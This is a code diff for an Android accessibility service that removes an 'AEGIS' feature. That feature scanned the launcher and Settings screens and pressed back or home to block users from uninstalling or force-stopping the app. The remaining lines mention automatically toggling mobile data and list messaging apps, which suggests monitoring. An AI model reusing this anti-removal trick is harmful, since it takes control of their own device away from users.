@@ -29,14 +29,6 @@ class MyAccessibilityService : AccessibilityService() {
     private var isLookingForToggle = false
     private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
     
-    // AEGIS STATE (Self Protection)
-    private val protectedApps = listOf("Cortex", "My Android")
-    private val dangerKeywords = listOf("Force stop", "Uninstall", "Storage", "Permissions")
-
-    // LAUNCHER CACHE
-    private var cachedLauncher: String = ""
-    private var lastLauncherCheck: Long = 0
-    
     // THROTTLE CONTROL
     private var lastScreenRead: Long = 0
     private val READ_DELAY = 1000L // Only read screen once per second
@@ -63,48 +55,6 @@ class MyAccessibilityService : AccessibilityService() {
         if (event == null) return
         
         val pkgName = event.packageName?.toString() ?: return
-
-        // --- 0. AEGIS PROTECTION (Highest Priority) ---
-        
-        // A. LAUNCHER GUARD (Anti-Long Press)
-        // Only scans if we are on the Home Screen (Launcher)
-        if (pkgName == getLauncherPackageName()) {
-             val root = rootInActiveWindow
-             if (root != null) {
-                 val text = StringBuilder()
-                 extractText(root, text)
-                 val content = text.toString()
-                 // If the popup menu appears with danger keywords
-                 if (content.contains("Uninstall", true) || content.contains("Remove", true) || content.contains("App info", true)) {
-                     DebugLogger.log("AEGIS", "Blocked Home Screen modification")
-                     performGlobalAction(GLOBAL_ACTION_BACK)
-                     return
-                 }
-             }
-        }
-
-        // B. SETTINGS GUARD (Anti-Force Stop)
-        if (pkgName == "com.android.settings" || pkgName == "com.google.android.packageinstaller" || pkgName == "com.android.packageinstaller") {
-            val root = rootInActiveWindow
-            if (root != null) {
-                val screenText = StringBuilder()
-                extractText(root, screenText)
-                val content = screenText.toString()
-                
-                // Check if we are looking at OUR app info
-                val isTargetingUs = protectedApps.any { content.contains(it, ignoreCase = true) }
-                
-                // Check if danger buttons are visible
-                val isDanger = dangerKeywords.any { content.contains(it, ignoreCase = true) }
-
-                if (isTargetingUs && isDanger) {
-                    DebugLogger.log("AEGIS", "Blocked user attempt to Force Stop/Uninstall!")
-                    performGlobalAction(GLOBAL_ACTION_BACK)
-                    performGlobalAction(GLOBAL_ACTION_HOME)
-                    return
-                }
-            }
-        }
 
         // --- 1. GHOST HAND LOGIC ---
         if (isGhostActive) {
@@ -234,19 +184,5 @@ class MyAccessibilityService : AccessibilityService() {
         val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
         for (app in apps) defaults.put(app, JSONObject())
         return defaults
-    }
-
-    private fun getLauncherPackageName(): String {
-        val now = System.currentTimeMillis()
-        // Only query the OS once every 60 seconds to save power
-        if (now - lastLauncherCheck > 60000 || cachedLauncher.isEmpty()) {
-            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN)
-            intent.addCategory(android.content.Intent.CATEGORY_HOME)
-            val resolveInfo = packageManager.resolveActivity(intent, android.content.pm.PackageManager.MATCH_DEFAULT_ONLY)
-            cachedLauncher = resolveInfo?.activityInfo?.packageName ?: ""
-            lastLauncherCheck = now
-            DebugLogger.log("AEGIS", "Launcher detected: $cachedLauncher")
-        }
-        return cachedLauncher
     }
 }
